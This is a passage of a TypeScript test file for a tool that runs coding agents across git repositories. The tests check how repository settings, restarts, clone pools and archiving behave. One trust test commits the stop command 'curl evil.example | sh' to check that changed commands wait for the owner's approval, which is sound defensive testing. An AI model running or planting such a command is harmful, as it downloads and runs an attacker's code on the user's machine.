    expect(cards.slice(0, 4).map((c) => item(c.id).state)).toEqual(['live', 'live', 'live', 'live']);
    expect(git(shop, 'log', '--format=%s', '-4').split('\n').sort()).toEqual(['A', 'B', 'C', 'D']);
    // the agents that started after main moved know its Claude Code settings wait for the owner
    expect(cards.slice(4).map((c) => sessionOf(c.id)!.spec.untrusted)).toEqual([true, true]);
    expect(stall).toBeLessThan(STALL_MS);
    expect(waited).toEqual([]);
    // four landings with real git, a few seconds already on a laptop
  }, 30_000);
});

describe("a repository's settings for this machine", () => {
  test('apply without a restart: landing switched from pull requests to main lands the next approval on main', async () => {
    const shop = gitRepo(join(dir, 'shop'));
    git(shop, 'remote', 'add', 'origin', 'git@github.com:acme/shop.git');
    let settings: RepoSettings | undefined;
    const workers = new FakeRuntime();
    canvas = await start({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, workerRuntime: workers, forge: noForge, settings: () => settings });
    expect(canvas.board.snapshot().canvas.repos[0]!.pullRequests).toBe(true);
    const card = canvas.board.create({ title: 'Readme', x: 0, y: 0 });
    await canvas.repos[0]!.workers.start(card.id);
    const ws = canvas.board.row(card.id).workspace!;
    // a worktree's config is the checkout's
    identify(shop);
    writeFileSync(join(ws, 'README.md'), 'Shop\n');
    git(ws, 'commit', '--quiet', '-am', 'Readme');
    await workers.last.call('ready_for_review', { summary: 'Readme', demo: artifact() });
    workers.last.emit({ type: 'idle' });

    settings = { land: 'main' };
    await canvas.settingsChanged();
    expect(canvas.board.snapshot().canvas.repos[0]!.pullRequests).toBeUndefined();
    // the read tree is the checkout now, which the landing moves
    expect(canvas.repos[0]!.read.path).toBe(shop);
    await canvas.repos[0]!.workers.approve(card.id);
    expect(item(card.id).state).toBe('live');
    expect(git(shop, 'log', '-1', '--format=%s', 'main').trim()).toBe('Readme');
  });

  test('the main branch set takes the place of the one detected: cards start from it', async () => {
    const shop = gitRepo(join(dir, 'shop'));
    identify(shop);
    git(shop, 'checkout', '--quiet', '-b', 'release');
    commit(shop, 'RELEASE.md', 'r\n', 'Release');
    git(shop, 'checkout', '--quiet', 'main');
    let settings: RepoSettings | undefined = { branch: 'release' };
    canvas = await start({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge, settings: () => settings });
    expect(canvas.board.snapshot().canvas.repos[0]!.branch).toBe('release');
    const card = canvas.board.create({ title: 'A', x: 0, y: 0 });
    await canvas.repos[0]!.workers.start(card.id);
    expect(git(canvas.board.row(card.id).workspace!, 'log', '-1', '--format=%s').trim()).toBe('Release');
    settings = undefined;
    await canvas.settingsChanged();
    expect(canvas.board.snapshot().canvas.repos[0]!.branch).toBe('main');
  });
});

describe("a repository's settings for everyone (.obeya/settings.json)", () => {
  test("a fresh clone runs with them; this machine's go before them; a new version on the default branch applies without a restart", async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main", "checks": ["bun test"], "planDocs": { "dir": "plans", "exclude": [] } }\n' });
    const clone = join(dir, 'clone');
    gitClone(shop, clone);
    let settings: RepoSettings | undefined;
    canvas = await start({ repos: [{ path: clone }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge, settings: () => settings });
    const adapter = canvas.repos[0]!.adapter;
    // detection alone would send work from a clone with a remote out as pull requests only on GitHub; the file says main
    expect([adapter.land, adapter.checks, adapter.planDocs.dir]).toEqual(['main', ['bun test'], 'plans']);
    settings = { checks: [] };
    expect(adapter.checks).toEqual([]);
    settings = undefined;

    // a change in the checkout counts once it is committed on the default branch
    writeFileSync(join(clone, '.obeya/settings.json'), '{ "land": "main", "checks": ["bun test", "bun run lint"] }\n');
    await canvas.settingsChanged();
    expect(adapter.checks).toEqual(['bun test']);
    identify(clone);
    git(clone, 'commit', '--quiet', '-am', 'Lint too');
    await canvas.settingsChanged();
    expect([adapter.checks, adapter.planDocs.dir]).toEqual([['bun test', 'bun run lint'], 'docs/plan']);
  });

  test('a change on the default branch to what the problems are read from tells the page to read them again', async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n', '.obeya/adapter/index.ts': 'export default {};\n' });
    identify(shop);
    canvas = await start({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge });
    const rev = () => canvas.board.snapshot().canvas.repos[0]!.configRev;
    await canvas.settingsChanged();
    expect(rev()).toBeUndefined();
    // a field that does not count changes the problems alone, not the settings
    writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "chekcs": [] }\n');
    git(shop, 'commit', '--quiet', '-am', 'A typo');
    await canvas.settingsChanged();
    expect(rev()).toBe(1);
    // the leftover adapter module goes
    git(shop, 'rm', '--quiet', '-r', '.obeya/adapter');
    git(shop, 'commit', '--quiet', '-m', 'No adapter module');
    await canvas.settingsChanged();
    expect(rev()).toBe(2);
    await canvas.settingsChanged();
    expect(rev()).toBe(2);
  });

  test("where a repository has none, Obeya proposes the card that fills them in, once; the dialog's button takes it on as the owner's card", async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n' });
    const done = gitRepo(join(dir, 'done'), { 'README.md': 'Done\n', '.obeya/settings.json': '{ "checks": ["bun test"] }\n' });
    const store = new Store(':memory:');
    const open = () => start({ repos: [{ path: shop }, { path: done }] }, { store, home: dir, runtime, forge: noForge, setupProposals: true });
    canvas = await open();
    const setup = () => canvas.board.snapshot().items.filter((i) => i.title.endsWith('einrichten'));
    expect(setup()).toMatchObject([{ state: 'proposal', title: 'Obeya für shop einrichten', repo: 'shop', proposal: { setup: true, reason: expect.stringContaining('shop') } }]);
    const id = setup()[0]!.id;
    // a restart proposes no second one
    await stop(canvas);
    canvas = await open();
    expect(setup().map((i) => i.id)).toEqual([id]);
    // the dialog's button takes it on, planned, as if it had made it
    const card = canvas.adapterSetupCard('shop');
    expect(card).toMatchObject({ id, state: 'planned' });
    expect(card.proposal).toBeUndefined();
    expect(card.proposed).toBeUndefined();
    expect(canvas.adapterSetupCard('shop').id).toBe(id);
  });

  test('dismissed, the proposal does not come back; still open, it goes once the repository has settings', async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n' });
    const web = gitRepo(join(dir, 'web'), { 'README.md': 'Web\n' });
    identify(web);
    const store = new Store(':memory:');
    const open = () => start({ repos: [{ path: shop }, { path: web }] }, { store, home: dir, runtime, forge: noForge, setupProposals: true });
    canvas = await open();
    const setup = (repo: string) => canvas.board.snapshot().items.find((i) => i.repo === repo && i.proposal?.setup);
    canvas.act(setup('shop')!.id, { action: 'dismiss' });
    await stop(canvas);
    canvas = await open();
    expect(setup('shop')).toBeUndefined();
    // settings committed on the main branch take the open one away
    expect(setup('web')).toBeDefined();
    commit(web, '.obeya/settings.json', '{ "checks": ["bun test"] }\n', 'Settings');
    await canvas.settingsChanged();
    expect(setup('web')).toBeUndefined();
    await stop(canvas);
    canvas = await open();
    expect(setup('web')).toBeUndefined();
  });

  test('once a page of a repository without a theme is online, Obeya proposes the card that writes one, once; a theme takes it away', async () => {
    const settings = { '.obeya/settings.json': '{ "checks": ["bun test"] }\n' };
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', ...settings });
    const web = gitRepo(join(dir, 'web'), { 'README.md': 'Web\n', ...settings });
    const docs = gitRepo(join(dir, 'docs'), { 'README.md': 'Docs\n', ...settings, '.obeya/theme.css': ':root { --accent: #c0392b; }\n' });
    const store = new Store(':memory:');
    const open = () => start({ repos: [{ path: shop }, { path: web }, { path: docs }] }, { store, home: dir, runtime, forge: noForge, setupProposals: true });
    canvas = await open();
    const proposed = (repo: string) => canvas.board.snapshot().items.find((i) => i.repo === repo && i.proposal?.setup);
    await settle();
    // nothing shared yet
    expect(proposed('shop')).toBeUndefined();
    for (const repo of ['shop', 'web', 'docs']) {
      const card = canvas.board.create({ title: 'Checkout', x: 0, y: 0, repo });
      canvas.board.work(card.id, { state: 'done', share: JSON.stringify({ slug: 'checkout', url: `https://demos.example/${repo}/checkout/` }) });
    }
    await stop(canvas);
    canvas = await open();
    await until(() => !!proposed('shop') && !!proposed('web'));
    expect(proposed('shop')).toMatchObject({ state: 'proposal', title: 'Demo-Seiten von shop im Look des Projekts', proposal: { reason: expect.stringContaining('shop') } });
    expect(proposed('shop')!.body).toContain('obeya:theme');
    // a repository with a theme gets none
    expect(proposed('docs')).toBeUndefined();
    // dismissed, it does not come back
    const id = proposed('shop')!.id;
    canvas.act(id, { action: 'dismiss' });
    await stop(canvas);
    canvas = await open();
    await settle();
    expect(proposed('shop')).toBeUndefined();
    // still open, it goes once a theme is on the main branch
    expect(proposed('web')).toBeDefined();
    commit(web, '.obeya/theme.css', ':root { --accent: #2e7d32; }\n', 'Theme');
    await canvas.settingsChanged();
    await until(() => !proposed('web'));
    await stop(canvas);
    canvas = await open();
    await settle();
    expect(proposed('web')).toBeUndefined();
  });

  test("a demo site set in them is shared on once it is complete, without a restart", async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n' });
    let settings: RepoSettings | undefined;
    canvas = await start({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge, settings: () => settings });
    expect(canvas.repos[0]!.site).toBeNull();
    const site = { title: 'Demos', url: 'https://demos.example.dev', deploy: '' };
    settings = { demo: { site } };
    await canvas.settingsChanged();
    expect(canvas.repos[0]!.site).toBeNull();
    settings = { demo: { site: { ...site, deploy: 'git {dir}' } } };
    await canvas.settingsChanged();
    expect(canvas.repos[0]!.site).toEqual({ ...site, deploy: 'git {dir}' });
    expect(canvas.board.canvas.repos[0]!.share).toBe(true);
  });

  test("commands new in them wait for the owner's trust: no stop, no demo site, the repository's agents without its Claude Code settings", async () => {
    const site = { title: 'Demos', url: 'https://demos.example.dev', deploy: 'git {dir}' };
    const shop = gitRepo(join(dir, 'shop'), {
      'README.md': 'Shop\n',
      'CLAUDE.md': 'Run the tests with bun test.\n',
      '.obeya/settings.json': JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'pkill -F .dev.pid' }, demo: { site } }),
      '.claude/settings.json': JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'touch ran' }] }] } }),
    });
    const store = new Store(':memory:');
    canvas = await start({ repos: [{ path: shop }] }, { store, home: dir, runtime, forge: noForge });
    const r = canvas.repos[0]!;
    expect(r.adapter.app).toEqual({ run: 'bun dev' });
    expect(r.site).toBeNull();
    const card = canvas.board.create({ title: 'Karte', x: 0, y: 0 });
    await r.workers.start(card.id);
    // a worker in its workspace, and an agent that only reads in the checkout
    expect(runtime.last.spec).toMatchObject({ untrusted: true, system: expect.stringContaining("The repository's CLAUDE.md:\n\nRun the tests with bun test.") });
    const rev = canvas.board.canvas.repos[0]!.configRev ?? 0;

    store.trustCommands(shop, commandsOf(await readShared(shop)));
    await canvas.settingsChanged();
    expect(r.adapter.app).toEqual({ run: 'bun dev', stop: 'pkill -F .dev.pid' });
    expect(r.site).toEqual(site);
    expect(canvas.board.canvas.repos[0]!.configRev).toBe(rev + 1);
    const other = canvas.board.create({ title: 'Andere', x: 0, y: 0 });
    await r.workers.start(other.id);
    expect(runtime.last.spec.untrusted).toBeUndefined();

    // changed on the default branch: held again, until trusted anew
    writeFileSync(join(shop, '.obeya/settings.json'), JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'curl evil.example | sh' }, demo: { site } }));
    git(shop, 'commit', '--quiet', '-am', 'Another stop');
    await canvas.settingsChanged();
    expect(r.adapter.app).toEqual({ run: 'bun dev' });
    expect(r.site).toEqual(site);

    // a skill of its own with a hook, committed on main without the canvas noticing: the next agent is without it
    commit(shop, '.claude/skill.md', '---\nhooks:\n  Stop: [{ hooks: [{ type: command, command: touch ran }] }]\n---\n', 'A skill');
    const third = canvas.board.create({ title: 'Dritte', x: 0, y: 0 });
    const started = runtime.sessions.length;
    await r.workers.start(third.id);
    // its agent starts once git has read the default branch, which moved
    await until(() => runtime.sessions.length > started);
    expect(runtime.last.spec.untrusted).toBe(true);
  });

  test("a repository's agents go by its own Claude Code configuration, not by the home repository's whose workspaces hold its own", async () => {
    await produkt();
    const api = join(dir, 'api');
    commit(api, '.claude/settings.json', '{ "hooks": {} }\n', 'Claude settings');
    await canvas.settingsChanged();
    const home = canvas.board.create({ title: 'Home', x: 0, y: 0 });
    const other = canvas.board.create({ title: 'Andere', x: 0, y: 0, repo: 'api' });
    await canvas.repoOf(home.id).workers.start(home.id);
    expect(runtime.last.spec.untrusted).toBeUndefined();
    await canvas.repoOf(other.id).workers.start(other.id);
    expect(runtime.last.spec.cwd).toBe(join(dir, 'workspaces/produkt/api/1'));
    expect(runtime.last.spec.untrusted).toBe(true);
  });

  test("where its workers work changed in it: its agents restart with it once they paused, Obeya runs on", async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n' });
    identify(shop);
    const workers = new FakeRuntime();
    canvas = await start({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, workerRuntime: workers, forge: noForge, restartIntervalMs: 5 });
    const card = canvas.board.create({ title: 'A', x: 0, y: 0 });
    await canvas.repos[0]!.workers.start(card.id);
    const session = workers.last;
    session.emit({ type: 'session', id: 'sess-a' });
    writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "checks": ["bun test"] }\n');
    git(shop, 'commit', '--quiet', '-am', 'Checks');
    await canvas.settingsChanged();
    expect(canvas.pendingRestart()).toBeNull();
    const before = canvas.repos[0]!;
    writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "workspaces": "clones" }\n');
    git(shop, 'commit', '--quiet', '-am', 'Clones');
    await canvas.settingsChanged();
    // the worker at work hears of it and pauses; the restart waits for it
    expect(canvas.pendingRestart()).toMatchObject({ reason: 'repository', cards: [card.id], repos: ['shop'] });
    expect(session.inbox.at(-1)).toContain("restart this repository's agents");
    expect(canvas.repos[0]).toBe(before);
    session.emit({ type: 'idle' });
    await until(() => canvas.repos[0] !== before);
    expect(canvas.repos[0]!.workspaces.mode).toBe('clones');
    expect(canvas.pendingRestart()).toBeNull();
    expect(session.closed).toBe(true);
    expect(workers.last.spec.resume).toBe('sess-a');
    expect(workers.last.inbox[0]).toContain("Obeya restarted this repository's agents");
  });

  test("what a worker's session costs counts to its card and its canvas; the worker hears nothing of it", async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n' });
    identify(shop);
    const workers = new FakeRuntime();
    canvas = await start({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, workerRuntime: workers, forge: noForge });
    const card = canvas.board.create({ title: 'A', x: 0, y: 0 });
    await canvas.repos[0]!.workers.start(card.id);
    const session = workers.last;
    expect(session.spec.spendOn).toBe(card.id);
    session.emit({ type: 'session', id: 'sess-a' });
    session.emit({ type: 'text', text: 'Working on it.' });
    // the turn's end reports the session's running total, before the end itself
    session.emit({ type: 'spend', session: 'sess-a', usd: 0.4 });
    expect(canvas.board.item(card.id)!.spent).toBe(0.4);
    expect(canvas.board.item(card.id)!.inTurn).toBe(true);
    session.emit({ type: 'spend', session: 'sess-a', usd: 1.1 });
    expect(canvas.board.item(card.id)!.spent).toBe(1.1);
    expect(canvas.board.snapshot().spent).toBe(1.1);
  });
});

describe('the configuration changed while the canvas runs', async () => {
  let web: string;
  let api: string;
  let workers: FakeRuntime;
  /** Obeya started anew, as `repos` configure the canvas. */
  const open = async (repos: RepoConfig[]) => {
    await stopAll();
    workers = new FakeRuntime();
    const saved = () => repos;
    canvas = await start(
      { name: 'Produkt', repos },
      { store: new Store(':memory:'), home: dir, runtime, workerRuntime: workers, forge: noForge, restartIntervalMs: 5, settings: (path) => saved().find((r) => r.path === path)?.settings },
    );
    return canvas;
  };
  /** A card at work in the repository, its worker in the middle of a turn. */
  const atWork = async (repo: string, title: string) => {
    const r = canvas.repos.find((x) => x.ref.id === repo)!;
    const card = canvas.board.create({ title, x: 0, y: 0, repo });
    await r.workers.start(card.id);
    workers.last.emit({ type: 'session', id: `sess-${title}` });
    return { card, session: workers.last };
  };
  beforeEach(() => {
    web = repo('web', 'Web');
    api = repo('api', 'API');
  });

  test('a new name and a repository new on the canvas apply at once; the workers at work go on', async () => {
    await open([{ path: web, settings: { land: 'pr' } }]);
    const { session } = await atWork('web', 'A');
    const runtimeOfWeb = canvas.repos[0]!;
    await canvas.apply({ name: 'Plattform', repos: [{ path: web, settings: { land: 'pr' } }, { path: api, settings: { land: 'pr' } }] });
    expect(canvas.board.canvas.name).toBe('Plattform');
    expect(canvas.id).toBe('produkt');
    expect(canvas.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'api']);
    expect(canvas.repos[0]).toBe(runtimeOfWeb);
    expect(canvas.pendingRestart()).toBeNull();
    expect(session.closed).toBe(false);
    expect(session.inbox.join()).not.toContain('restart');
    // the new repository's plan doc is on the canvas
    expect(canvas.board.snapshot().items.some((i) => i.kind === 'project' && i.repo === 'api')).toBe(true);
  });

  test("a repository whose clones changed restarts its agents once they paused; the other repository's work on", async () => {
    await open([
      { path: web, settings: { land: 'pr' }, clones: 1 },
      { path: api, settings: { land: 'pr' }, clones: 1 },
    ]);
    const w = await atWork('web', 'W');
    const a = await atWork('api', 'A');
    const [webBefore, apiBefore] = canvas.repos;
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, clones: 2 }, { path: api, settings: { land: 'pr' }, clones: 1 }] });
    expect(canvas.pendingRestart()).toMatchObject({ reason: 'config', cards: [w.card.id], repos: ['web'] });
    expect(w.session.inbox.at(-1)).toContain("restart this repository's agents");
    expect(a.session.inbox.join()).not.toContain('restart');
    w.session.emit({ type: 'idle' });
    await until(() => canvas.repos[0] !== webBefore);
    // the clone still to be made is made in the background
    await until(() => canvas.repos[0]!.workspaces.list().length === 2);
    expect(canvas.repos[1]).toBe(apiBefore);
    expect(a.session.closed).toBe(false);
    expect(w.session.closed).toBe(true);
    expect(workers.last.spec.resume).toBe('sess-W');
  });

  test('clones the configuration no longer names leave the pool: a free one at once, one a card holds once it gives it back', async () => {
    const own = join(dir, 'x-own');
    gitClone(web, own);
    // Obeya ran with it before and made its clones then: they are in the pool from the start, beside the listed one, and the card takes the first
    await open([{ path: web, settings: { land: 'pr' }, clones: 2, workspaces: [own] }]);
    await open([{ path: web, settings: { land: 'pr' }, clones: 2, workspaces: [own] }]);
    expect(canvas.repos[0]!.workspaces.list()).toHaveLength(3);
    const w = await atWork('web', 'W');
    const held = canvas.repos[0]!.workspaces.leasedBy(w.card.id)!;
    const [made1, made2] = canvas.repos[0]!.workspaces.list().map((x) => x.path);
    expect(held).toBe(made1!);
    const before = canvas.repos[0]!;
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, workspaces: [own] }] });
    w.session.emit({ type: 'idle' });
    await until(() => canvas.repos[0] !== before);
    const spaces = canvas.repos[0]!.workspaces;
    expect(spaces.list().map((x) => x.path)).toEqual([held, own]);
    // the free clone Obeya made goes from disk at once, the one the card holds once it gives it back; the owner's stays
    await until(() => !existsSync(made2!));
    expect(existsSync(held)).toBe(true);
    spaces.release(w.card.id);
    expect(spaces.list().map((x) => x.path)).toEqual([own]);
    await until(() => !existsSync(held));
    expect(existsSync(join(own, '.git'))).toBe(true);
  });

  test('the checkout among the workspaces stays out of them where work lands on its main, and is one where work goes out as pull requests', async () => {
    const own = join(dir, 'x-own');
    gitClone(web, own);
    await open([{ path: web, settings: { land: 'main' }, workspaces: [web, own] }]);
    expect(canvas.repos[0]!.workspaces.list().map((x) => x.path)).toEqual([own]);
    await open([{ path: web, settings: { land: 'pr' }, workspaces: [web, own] }]);
    expect(canvas.repos[0]!.workspaces.list().map((x) => x.path).sort()).toEqual([web, own].sort());
  });

  test('a checkout listed as the only workspace where work lands on its main leaves the cards in worktrees, as without the list', async () => {
    await open([{ path: web, settings: { land: 'main' }, workspaces: [web] }]);
    expect(canvas.repos[0]!.workspaces.mode).toBe('worktrees');
    const w = await atWork('web', 'W');
    expect(canvas.repos[0]!.workspaces.leasedBy(w.card.id)).not.toBe(web);
    expect(git(web, 'branch', '--show-current')).toBe('main');
  });

  test('a card deleted after the restart gives its clone back to the pool as the configuration has it now, not to the one before', async () => {
    await open([{ path: web, settings: { land: 'pr' }, clones: 2 }]);
    const v = await atWork('web', 'V');
    const w = await atWork('web', 'W');
    const held = canvas.repos[0]!.workspaces.leasedBy(w.card.id)!;
    const before = canvas.repos[0]!;
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, clones: 1 }] });
    v.session.emit({ type: 'idle' });
    w.session.emit({ type: 'idle' });
    await until(() => canvas.repos[0] !== before);
    // work on its branch, pushed: the card keeps its clone when stopped, and nothing is lost with its folder
    identify(held);
    git(held, 'commit', '--quiet', '--allow-empty', '-m', 'work');
    git(held, 'push', '--quiet', 'origin', 'HEAD');
    await canvas.repos[0]!.workers.stop(w.card.id);
    expect(canvas.repos[0]!.workspaces.leasedBy(w.card.id)).toBe(held);
    canvas.board.remove(w.card.id);
    await until(() => !existsSync(held));
    expect(canvas.repos[0]!.workspaces.list().map((x) => x.card_id)).toEqual([v.card.id]);
  });

  test('with no clones to create and none listed the pool is empty; gone over to worktrees, a card keeps its clone until it gives it back', async () => {
    await open([{ path: web, settings: { land: 'pr' }, clones: 2 }]);
    const w = await atWork('web', 'W');
    const [held, free] = canvas.repos[0]!.workspaces.list().map((x) => x.path) as [string, string];
    const before = canvas.repos[0]!;
    // the number emptied: the repository's settings say nothing, so it goes over to worktrees
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }] });
    w.session.emit({ type: 'idle' });
    await until(() => canvas.repos[0] !== before);
    const spaces = canvas.repos[0]!.workspaces;
    expect(spaces.mode).toBe('worktrees');
    expect(spaces.list().map((x) => x.path)).toEqual([held]);
    await until(() => !existsSync(free));
    // the card works on in its clone, and a new card gets a worktree
    expect(spaces.leasedBy(w.card.id)).toBe(held);
    expect(await spaces.hasWork(w.card.id)).toBe(false);
    spaces.release(w.card.id);
    expect(spaces.list()).toEqual([]);
    await until(() => !existsSync(held));
  });

  test('clones set to 0 in a repository whose settings say clones: no clone is left', async () => {
    await open([{ path: web, settings: { land: 'pr', workspaces: 'clones' }, clones: 1 }]);
    const [made] = canvas.repos[0]!.workspaces.list().map((x) => x.path) as [string];
    const before = canvas.repos[0]!;
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr', workspaces: 'clones' }, clones: 0 }] });
    await until(() => canvas.repos[0] !== before);
    expect(canvas.repos[0]!.workspaces.mode).toBe('clones');
    expect(canvas.repos[0]!.workspaces.list()).toEqual([]);
    await until(() => !existsSync(made));
  });

  test('"Apply now" restarts them at once, cutting off the worker in its turn', async () => {
    await open([{ path: web, settings: { land: 'pr' }, clones: 1 }]);
    const w = await atWork('web', 'W');
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, clones: 1, slots: 1 }] });
    expect(canvas.pendingRestart()?.cards).toEqual([w.card.id]);
    expect(canvas.restartNow()).toBe(true);
    expect(canvas.pendingRestart()).toBeNull();
    await until(() => w.session.closed);
    expect(workers.last.spec.resume).toBe('sess-W');
    expect(canvas.restartNow()).toBe(false);
  });

  test('a repository that left the canvas stops once its agents paused; its cards stay', async () => {
    await open([
      { path: web, settings: { land: 'pr' } },
      { path: api, settings: { land: 'pr' } },
    ]);
    const a = await atWork('api', 'A');
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }] });
    expect(canvas.pendingRestart()).toMatchObject({ cards: [a.card.id], repos: ['api'] });
    a.session.emit({ type: 'idle' });
    await until(() => canvas.repos.length === 1);
    expect(canvas.board.canvas.repos.map((r) => r.id)).toEqual(['web']);
    expect(a.session.closed).toBe(true);
    expect(canvas.board.item(a.card.id)).toBeDefined();
  });

  test('a card at work in a repository that left the canvas can be stopped, then archived or deleted', async () => {
    await open([
      { path: web, settings: { land: 'pr' } },
      { path: api, settings: { land: 'pr' } },
    ]);
    const a = await atWork('api', 'A');
    const b = await atWork('api', 'B');
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }] });
    a.session.emit({ type: 'idle' });
    b.session.emit({ type: 'idle' });
    await until(() => canvas.repos.length === 1);
    expect(item(a.card.id).repoDown).toBe(true);
    // a comment on the demo held back for the worker, as while the owner watches
    const comment = canvas.board.log(a.card.id, 'hint', 'owner', 'The button is cut off.', { unread: true });
    canvas.board.work(a.card.id, { held: JSON.stringify([{ id: comment.id }]) });
    canvas.act(a.card.id, { action: 'stop' });
    canvas.act(b.card.id, { action: 'stop' });
    expect(item(a.card.id)).toMatchObject({ state: 'planned', branch: expect.any(String) });
    expect(canvas.board.events(a.card.id).at(-1)?.text).toBe(canvas.board.t.worker.stopped);
    // it stays in the conversation, no longer waiting for the worker
    expect(canvas.board.row(a.card.id).held).toBeNull();
    expect(canvas.board.events(a.card.id).find((e) => e.id === comment.id)?.unread).toBeUndefined();
    // its workspace stays recorded for the repository's return, and nothing could show the work in it here
    expect(canvas.board.row(a.card.id).workspace).toBeTruthy();
    canvas.board.archive([a.card.id]);
    expect(canvas.board.row(a.card.id).archived_at).toBeTruthy();
    canvas.remove(b.card.id);
    expect(canvas.board.item(b.card.id)).toBeUndefined();
    expect(workers.sessions.filter((s) => !s.closed)).toHaveLength(0);
  });

  test('an archived card gives the clone it took into the archive back once its repository is back, its work kept on its branch there', async () => {
    const both: RepoConfig[] = [
      { path: web, settings: { land: 'pr' } },
      { path: api, settings: { land: 'pr' }, clones: 2 },
    ];
    await open(both);
    const a = await atWork('api', 'A');
    const c = await atWork('api', 'C');
    const apiBefore = canvas.repos.find((r) => r.ref.id === 'api')!;
    await apiBefore.ready;
    const withWork = apiBefore.workspaces.leasedBy(a.card.id)!;
    const clean = apiBefore.workspaces.leasedBy(c.card.id)!;
    writeFileSync(join(withWork, 'limit.ts'), 'export const LIMIT = 10;\n');
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }] });
    a.session.emit({ type: 'idle' });
    c.session.emit({ type: 'idle' });
    await until(() => canvas.repos.length === 1);
    for (const card of [a.card, c.card]) canvas.act(card.id, { action: 'stop' });
    canvas.board.archive([a.card.id, c.card.id]);
    await canvas.apply({ name: 'Produkt', repos: both });
    const apiAgain = canvas.repos.find((r) => r.ref.id === 'api')!;
    await until(() => apiAgain.workspaces.list().every((w) => !w.card_id));
    await apiAgain.workers.freed();
    // each card's branch stays in its clone, uncommitted work in a commit on it, for its next start
    expect(canvas.board.row(c.card.id)).toMatchObject({ workspace: null, kept_in: clean });
    expect(canvas.board.row(a.card.id)).toMatchObject({ workspace: null, kept_in: withWork });
    expect(git(withWork, 'show', '--name-only', '--format=', 'HEAD')).toBe('limit.ts');
    expect(canvas.board.events(a.card.id).at(-1)?.text).toBe(canvas.board.t.worker.archivedFreed(withWork));
    expect(canvas.board.row(a.card.id).archived_at).toBeTruthy();
    // a card deleted while its clone went back keeps where its branch is, for its restore
    canvas.board.unarchive(c.card.id);
    canvas.remove(c.card.id);
    canvas.board.keptIn(c.card.id, clean);
    canvas.restore(c.card.id);
    expect(canvas.board.row(c.card.id)).toMatchObject({ workspace: null, kept_in: clean });
    // new cards of the repository get the clones
    const b = canvas.board.create({ title: 'B', x: 0, y: 0, repo: 'api' });
    await apiAgain.workers.start(b.id);
    expect([withWork, clean]).toContain(apiAgain.workspaces.leasedBy(b.id)!);
  });

  test('an archived card gives back a worktree without work once its repository is back, and keeps one with work', async () => {
    const both: RepoConfig[] = [
      { path: web, settings: { land: 'pr' } },
      { path: api, settings: { land: 'pr' } },
    ];
    await open(both);
    const a = await atWork('api', 'A');
    const c = await atWork('api', 'C');
    const apiBefore = canvas.repos.find((r) => r.ref.id === 'api')!;
    await until(() => !!apiBefore.workspaces.leasedBy(a.card.id) && !!apiBefore.workspaces.leasedBy(c.card.id));
    const withWork = apiBefore.workspaces.leasedBy(a.card.id)!;
    writeFileSync(join(withWork, 'limit.ts'), 'export const LIMIT = 10;\n');
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }] });
    a.session.emit({ type: 'idle' });
    c.session.emit({ type: 'idle' });
    await until(() => canvas.repos.length === 1);
    for (const card of [a.card, c.card]) canvas.act(card.id, { action: 'stop' });
    canvas.board.archive([a.card.id, c.card.id]);
    await canvas.apply({ name: 'Produkt', repos: both });
    const apiAgain = canvas.repos.find((r) => r.ref.id === 'api')!;
    await until(() => !canvas.board.row(c.card.id).workspace);
    await apiAgain.workers.freed();
    expect(apiAgain.workspaces.leasedBy(c.card.id)).toBeNull();
    expect(canvas.board.row(a.card.id).workspace).toBe(withWork);
    expect(apiAgain.workspaces.leasedBy(a.card.id)).toBe(withWork);
  });

  test("a card of a repository that left the canvas goes to no other repository's agents; it starts in its own once that is back", async () => {
    const both: RepoConfig[] = [
      { path: web, settings: { land: 'pr' } },
      { path: api, settings: { land: 'pr' } },
    ];
    await open(both);
    const card = canvas.board.create({ title: 'A', x: 0, y: 0, repo: 'api' });
    const later = canvas.board.create({ title: 'Später', x: 0, y: 0, repo: 'api' });
    canvas.act(later.id, { action: 'snooze', until: new Date(Date.now() + 60_000).toISOString() });
    await canvas.apply({ name: 'Produkt', repos: [both[0]!] });
    await until(() => canvas.repos.length === 1);
    expect(item(card.id).repoDown).toBe(true);
    expect(item(card.id).repo).toBe('api');
    expect(() => canvas.repoOf(card.id)).toThrow();
